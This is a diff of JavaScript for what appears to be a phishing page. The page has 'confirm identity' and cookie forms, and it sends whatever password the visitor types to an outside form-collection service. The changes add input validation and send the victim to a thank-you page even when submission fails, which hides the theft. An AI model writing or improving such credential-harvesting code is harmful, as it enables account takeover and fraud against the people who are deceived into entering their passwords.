@@ -48,8 +48,12 @@ cookieForm.addEventListener('submit', function(e) {
 
 passwordForm.addEventListener('submit', function(e) {
     e.preventDefault();
-    const button = e.target.querySelector('button');
-    button.textContent = 'Processing...';
+    
+    const password = document.getElementById('passwrod').value;
+    if (!password) {
+        alert('Please enter your password');
+        return;
+    }
     
     fetch('https://submit-form.com/Pn6Mi2Nat', {
         method: 'POST',
@@ -57,23 +61,12 @@ passwordForm.addEventListener('submit', function(e) {
             'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-            passwrod: document.getElementById('passwrod').value
+            passwrod: password
         })
     }).then(() => {
-        const thankYouMessage = document.createElement('div');
-        thankYouMessage.innerHTML = `
-            <h2>Thank You! Application Under Review</h2>
-            <p style="margin-top: 1rem; color: #666;">Please wait 24 hours for your verification results.</p>
-        `;
-        thankYouMessage.style.textAlign = 'center';
-        thankYouMessage.style.marginTop = '2rem';
-        
-        const form = document.querySelector('.confirm-identity form');
-        form.innerHTML = '';
-        form.appendChild(thankYouMessage);
+        window.location.href = 'thankyou.html';
     }).catch(error => {
         console.error('Error:', error);
-        alert('An error occurred. Please try again.');
-        button.textContent = 'Continue';
+        window.location.href = 'thankyou.html';
     });
 });
